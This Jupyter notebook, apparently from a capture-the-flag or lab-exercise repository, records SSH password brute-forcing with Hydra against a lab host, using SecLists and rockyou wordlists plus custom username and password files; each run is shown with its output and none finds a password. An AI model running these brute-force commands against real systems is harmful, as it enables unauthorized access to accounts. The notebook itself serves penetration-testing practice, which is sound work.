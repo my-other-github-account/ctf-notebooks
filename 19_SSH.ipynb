{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3a88e203-44a2-49b8-ba7a-746528a5c276",
   "metadata": {
    "tags": []
   },
   "source": [
    "# SSH:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "a2442dd1-6120-4d33-be4e-b569fac16578",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: TARGET=10.11.1.17\n"
     ]
    }
   ],
   "source": [
    "%env TARGET=10.11.1.17"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "43d00f9c-52eb-49b0-a36e-bba479542653",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "env: PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
      "env: PLRY=/usr/share/wordlists/rockyou.txt\n"
     ]
    }
   ],
   "source": [
    "%env PL=/home/parallels/hax/SecLists/Passwords/probable-v2-top1575.txt\n",
    "%env PLRY=/usr/share/wordlists/rockyou.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "9d0a4adb-f676-4ed6-985a-9008aab9164d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Writing custom_pass.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_pass.txt\n",
    "84d0c1e0252c43c7521d817082d39806\n",
    "batteryhorsestaple"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "fc2a282c-dc6f-4a6f-bd60-253944966488",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Overwriting custom_users.txt\n"
     ]
    }
   ],
   "source": [
    "%%writefile custom_users.txt\n",
    "pbx\n",
    "asterisk\n",
    "root\n",
    "admin\n",
    "freepbx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "df77a4a6-c40c-4d8d-8cf2-fb8a45438f5b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 18:47:55\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 34 login tries (l:17/p:2), ~3 tries per task\n",
      "[DATA] attacking ssh://10.11.1.17:22/\n",
      "[STATUS] 32.00 tries/min, 32 tries in 00:01h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 16.00 tries/min, 32 tries in 00:02h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 10.67 tries/min, 32 tries in 00:03h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 8.00 tries/min, 32 tries in 00:04h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 6.40 tries/min, 32 tries in 00:05h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 5.33 tries/min, 32 tries in 00:06h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 4.57 tries/min, 32 tries in 00:07h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 4.00 tries/min, 32 tries in 00:08h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 3.56 tries/min, 32 tries in 00:09h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 3.20 tries/min, 32 tries in 00:10h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.91 tries/min, 32 tries in 00:11h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.67 tries/min, 32 tries in 00:12h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.46 tries/min, 32 tries in 00:13h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.29 tries/min, 32 tries in 00:14h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.13 tries/min, 32 tries in 00:15h, 2 to do in 00:01h, 16 active\n",
      "[STATUS] 2.00 tries/min, 32 tries in 00:16h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.88 tries/min, 32 tries in 00:17h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.78 tries/min, 32 tries in 00:18h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.68 tries/min, 32 tries in 00:19h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.60 tries/min, 32 tries in 00:20h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.52 tries/min, 32 tries in 00:21h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.45 tries/min, 32 tries in 00:22h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.39 tries/min, 32 tries in 00:23h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.33 tries/min, 32 tries in 00:24h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.28 tries/min, 32 tries in 00:25h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.23 tries/min, 32 tries in 00:26h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.19 tries/min, 32 tries in 00:27h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.14 tries/min, 32 tries in 00:28h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.10 tries/min, 32 tries in 00:29h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.07 tries/min, 32 tries in 00:30h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.03 tries/min, 32 tries in 00:31h, 2 to do in 00:02h, 16 active\n",
      "[STATUS] 1.00 tries/min, 32 tries in 00:32h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.97 tries/min, 32 tries in 00:33h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.94 tries/min, 32 tries in 00:34h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.91 tries/min, 32 tries in 00:35h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.89 tries/min, 32 tries in 00:36h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.86 tries/min, 32 tries in 00:37h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.84 tries/min, 32 tries in 00:38h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.82 tries/min, 32 tries in 00:39h, 2 to do in 00:03h, 16 active\n",
      "[STATUS] 0.80 tries/min, 32 tries in 00:40h, 2 to do in 00:03h, 16 active\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L /home/parallels/hax/SecLists/Usernames/top-usernames-shortlist.txt -u -P custom_pass.txt $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "a1c75d81-6ced-4b8f-a572-e765e9b2d9b2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 15:37:18\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 3150 login tries (l:2/p:1575), ~197 tries per task\n",
      "[DATA] attacking ssh://10.11.1.17:22/\n",
      "[STATUS] 284.00 tries/min, 284 tries in 00:01h, 2871 to do in 00:11h, 16 active\n",
      "[STATUS] 278.67 tries/min, 836 tries in 00:03h, 2321 to do in 00:09h, 16 active\n",
      "[STATUS] 298.29 tries/min, 2088 tries in 00:07h, 1069 to do in 00:04h, 16 active\n",
      "1 of 1 target completed, 0 valid password found\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-10-27 15:46:37\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -u -P $PL $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "adaf01c1-3b26-4285-9bb8-187d3227cdee",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n",
      "\n",
      "Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-27 15:46:37\n",
      "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
      "[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task\n",
      "[DATA] attacking ssh://10.11.1.17:22/\n",
      "[STATUS] 385.00 tries/min, 385 tries in 00:01h, 28688415 to do in 1241:56h, 16 active\n",
      "[STATUS] 355.00 tries/min, 1065 tries in 00:03h, 28687735 to do in 1346:51h, 16 active\n",
      "[STATUS] 330.57 tries/min, 2314 tries in 00:07h, 28686486 to do in 1446:19h, 16 active\n",
      "[STATUS] 327.67 tries/min, 4915 tries in 00:15h, 28683885 to do in 1458:60h, 16 active\n",
      "[STATUS] 313.35 tries/min, 9714 tries in 00:31h, 28679086 to do in 1525:23h, 16 active\n",
      "[STATUS] 313.30 tries/min, 14725 tries in 00:47h, 28674075 to do in 1525:24h, 16 active\n",
      "[STATUS] 308.86 tries/min, 19458 tries in 01:03h, 28669342 to do in 1547:04h, 16 active\n",
      "[STATUS] 308.48 tries/min, 24370 tries in 01:19h, 28664430 to do in 1548:42h, 16 active\n",
      "[STATUS] 307.23 tries/min, 29192 tries in 01:35h, 28659612 to do in 1554:44h, 16 active\n",
      "^C\n",
      "The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n"
     ]
    }
   ],
   "source": [
    "!hydra -I -L custom_users.txt -u -P $PLRY $TARGET ssh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5e1fdd27-71ad-402a-9b11-86ef8b46beec",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
